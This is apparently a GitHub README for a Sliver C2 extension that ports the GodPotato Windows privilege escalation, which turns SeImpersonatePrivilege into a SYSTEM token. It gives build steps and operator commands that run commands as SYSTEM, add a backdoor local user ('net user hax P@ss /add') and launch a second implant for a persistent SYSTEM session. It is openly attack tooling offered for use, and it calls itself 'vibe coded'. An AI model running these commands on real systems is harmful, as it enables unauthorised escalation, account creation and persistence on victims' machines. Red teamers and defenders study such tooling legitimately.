# GodPotatoBOF-Sliver



An 100% vibe coded [Sliver C2](https://github.com/BishopFox/sliver) extension port of [GodPotatoBOF](https://github.com/incursi0n/GodPotatoBOF) by incursi0n, itself based on [GodPotato](https://github.com/BeichenDream/GodPotato) by BeichenDream.

Triggers the GodPotato privilege escalation flow (COM/RPC dispatch table hook) to obtain a `NT AUTHORITY\SYSTEM` token and either run a command or apply the token to the current session.

## Requirements

- `SeImpersonatePrivilege` on the target
- Sliver with `coff-loader` extension installed
- MinGW cross-compiler and [boflink](https://github.com/MEhrn00/boflink) to build

## Build

**Dependencies:** MinGW cross-compiler and [boflink](https://github.com/MEhrn00/boflink/releases).

```bash
apt install mingw-w64 make
# Place boflink binary in the repo root and make it executable
chmod +x boflink install.sh
./install.sh
```

`install.sh` also accepts `build`, `install`, or `clean` as arguments. The compiled `.o` files are copied into `sliver-extensions/godpotato/` automatically.

## Load in Sliver

```
sliver > extensions load /path/to/GodPotatoBOF-Sliver/sliver-extensions/godpotato
sliver > extensions list
```

If the `.o` files are missing after load, copy them manually:

```bash
cp sliver-extensions/godpotato/*.o ~/.sliver-client/extensions/godpotato/
```

## Usage

```
sliver (SESSION) > godpotato
sliver (SESSION) > godpotato -- -cmd "whoami /all"
sliver (SESSION) > godpotato -- -cmd "net user hax P@ss /add"
sliver (SESSION) > godpotato -- -cmd "C:\Windows\Temp\implant.exe"
sliver (SESSION) > godpotato -- -cmd "whoami" -pipe mypipe
```

| Argument | Description |
|---|---|
| *(none)* | Run `cmd /c whoami` as SYSTEM |
| `-- -cmd "<command>"` | Run a command as SYSTEM |
| `-- -cmd "<implant path>"` | Spawn a second implant as SYSTEM for a persistent SYSTEM session |
| `-- -pipe <name>` | Use a custom named pipe (auto-generated if omitted) |

> **Note:** The `token` keyword (`-cmd token`) calls `BeaconUseToken()` but Sliver's coff-loader does not persist impersonation tokens across tasks. Use `-cmd` to run commands as SYSTEM directly, or execute a second implant to get a persistent SYSTEM session.

## Credits

- Original GodPotato: https://github.com/BeichenDream/GodPotato
- GodPotatoBOF: https://github.com/incursi0n/GodPotatoBOF
- boflink: https://github.com/MEhrn00/boflink
- BOF template: https://github.com/trustedsec/CS-Situational-Awareness-BOF
